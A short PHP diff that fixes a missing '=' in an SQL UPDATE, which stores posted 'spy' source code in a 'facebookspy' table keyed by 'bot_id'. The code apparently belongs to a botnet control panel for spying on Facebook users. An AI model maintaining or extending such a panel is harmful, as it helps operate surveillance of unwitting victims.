@@ -122,7 +122,7 @@ elseif(isset($_POST['add_source_spy']) && $_POST['add_source_spy'] != '' && isse
         $select->bindParam(':id', $ids);
         $select->execute();
         if($select->rowCount() > 0){
-            $update = $bdd->prepare("UPDATE facebookspy SET source_code  :source_code WHERE bot_id = :bot_id");
+            $update = $bdd->prepare("UPDATE facebookspy SET source_code = :source_code WHERE bot_id = :bot_id");
             $update->bindParam(':source_code', $_POST['add_source_spy']);
             $update->bindParam(':bot_id', $ids);
             $update->execute();
